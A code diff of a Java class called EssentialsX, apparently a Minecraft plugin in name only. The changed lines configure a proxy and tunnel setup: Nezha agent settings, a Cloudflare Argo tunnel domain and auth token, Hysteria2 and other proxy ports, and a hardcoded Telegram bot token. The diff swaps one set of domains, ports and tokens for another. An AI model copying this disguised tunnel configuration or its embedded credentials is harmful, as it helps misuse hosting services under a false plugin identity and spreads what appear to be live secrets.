@@ -78,11 +78,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "23308");
-        env.put("ARGO_DOMAIN", "apex.1976.dpdns.org");
-        env.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiZmNkOTFmNjAtNGM0Mi00ZmI3LTkzY2ItNTBkMTcxMTZjZGI0IiwicyI6Ik9UVm1aRFptTnpndFpEVTRNeTAwTnpkaExXRTRNR1F0WVRVMU1EVTJPVFV4WTJNMSJ9");
+        env.put("ARGO_PORT", "8001");
+        env.put("ARGO_DOMAIN", "witchly.smail.qzz.io");
+        env.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiYWMzZGNkZTUtYzZmNS00MjRjLWIwMTUtMzI3Y2EzMzRmMDMwIiwicyI6Ik5EZ3dNelJqTURJdE5HVTBZeTAwTVRoakxXRXlOemN0TW1KbE1tRTNOamc0WVRkayJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "23308");
+        env.put("HY2_PORT", "40458");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "7615526848:AAGVWjn03O5rdWiacPhtcl6TexJ7DQFTFb8");
         env.put("CFIP", "cdns.doon.eu.org");
         env.put("CFPORT", "443");
-        env.put("NAME", "apex");
+        env.put("NAME", "witchly");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
